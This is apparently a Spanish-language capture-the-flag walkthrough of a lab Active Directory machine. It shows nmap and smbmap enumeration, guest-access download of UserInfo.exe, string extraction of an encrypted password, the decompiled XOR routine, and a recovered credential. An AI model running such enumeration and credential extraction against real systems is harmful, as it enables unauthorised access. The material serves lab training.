En la fase de RECONOCIMIENTO usamos nmap

==nmap -sV 10.129.97.235==       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 13:33 -0400  
Nmap scan report for 10.129.97.235  
Host is up (0.20s latency).  
Not shown: 988 filtered tcp ports (no-response)  
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-27 17:34:04Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default  
-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default  
-First-Site-Name)  
3269/tcp open  tcpwrapped  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 31.94 seconds

Aprovechamos el puerto 445 para realizar un SMBMAP
==smbmap -H 10.129.97.235 -u usuario==             
  ________  ___      ___  _______   ___      ___       __         _______  
  /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\  
 (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)  
  \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/  
   __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /  
  /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \  
 (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)  
-----------------------------------------------------------------------------  
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com  
                    https://github.com/ShawnDEvans/smbmap  
  
[*] Detected 1 hosts serving SMB                                                                           
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                        
                                                                                                      
[+] IP: 10.129.97.235:445       Name: 10.129.97.235             Status: Authenticated  
       Disk                                                    Permissions     Comment  
       ----                                                    -----------     -------  
       ADMIN$                                                  NO ACCESS       Remote Admin  
       C$                                                      NO ACCESS       Default share  
       IPC$                                                    READ ONLY       Remote IPC  
       NETLOGON                                                NO ACCESS       Logon server share    
       support-tools                                           READ ONLY       support staff tools  
       SYSVOL                                                  NO ACCESS       Logon server share


smbmap -H 10.129.97.235 -u invitado -r 'support-tools'
[+] IP: 10.129.97.235:445       Name: 10.129.97.235             Status: Authenticated  
       Disk                                                    Permissions     Comment  
       ----                                                    -----------     -------  
       ADMIN$                                                  NO ACCESS       Remote Admin  
       C$                                                      NO ACCESS       Default share  
       IPC$                                                    READ ONLY       Remote IPC  
       NETLOGON                                                NO ACCESS       Logon server share    
       support-tools                                           READ ONLY       support staff tools  
       ./support-tools  
       dr--r--r--                0 Wed Jul 20 13:01:06 2022    .  
       dr--r--r--                0 Sat May 28 07:18:25 2022    ..  
       fr--r--r--          2880728 Sat May 28 07:19:19 2022    7-ZipPortable_21.07.paf.exe  
       fr--r--r--          5439245 Sat May 28 07:19:55 2022    npp.8.4.1.portable.x64.zip  
       fr--r--r--          1273576 Sat May 28 07:20:06 2022    putty.exe  
       fr--r--r--         48102161 Sat May 28 07:19:31 2022    SysinternalsSuite.zip  
       fr--r--r--           277499 Wed Jul 20 13:01:07 2022    UserInfo.exe.zip  
       fr--r--r--            79171 Sat May 28 07:20:17 2022    windirstat1_1_2_setup.exe  
       fr--r--r--         44398000 Sat May 28 07:19:43 2022    WiresharkPortable64_3.6.5.paf.exe  
       SYSVOL                                                  NO ACCESS       Logon server share


Dentro de las support tools hay una que no encaja con la descripcion y la descargamos localmente para revisar

smbmap -H 10.129.97.235 -u invitado --download 'support-tools\UserInfo.exe.zip'

Se examina el .exe en busca de strings que sean utiles 
──(kode㉿localhost)-[~/Downloads]  
└─$ strings /home/kode/Downloads/UserInfo.exe/UserInfo.exe | grep -iE '(pass|user|admin|@|http|ldap|10\.  
)'    
  
@.reloc  
<UserName>k__BackingField  
getPassword  
enc_password  
get_UserName  
set_UserName  
username  
UserInfo.exe  
UserInfo  
FindUser  
GetUser  
printUser  
UserInfo.Commands  
UserInfo.Services  
FindUserOptions  
GetUserOptions  
LdapQuery  
UserInfo  
UserInfo.Program+<Main>d__0  
/UserInfo.Commands.FindUser+<OnExecuteAsync>d__2  
.UserInfo.Commands.GetUser+<OnExecuteAsync>d__2  
username  
Username  
C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb

hay un campo ==enc_password== y un método ==getPassword==

usamos el siguiente comando para examinar 
strings -el UserInfo.exe/UserInfo.exe | grep -E '^[A-Za-z0-9+/=]{30,}$'
==0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E==


### Por qué supiste que era XOR

**Porque lo dice el código.** Al decompilar el .NET (ILSpy, `monodis`, etc.) ves el método `getPassword()`:

```
public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
        array[i] = (byte)(array[i] ^ key[i % key.Length] ^ 0xDF);
    return Encoding.Default.GetString(array);
}
```

El operador `^` en C# **es XOR**. Ahí está explícito.


Clave encontrada
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

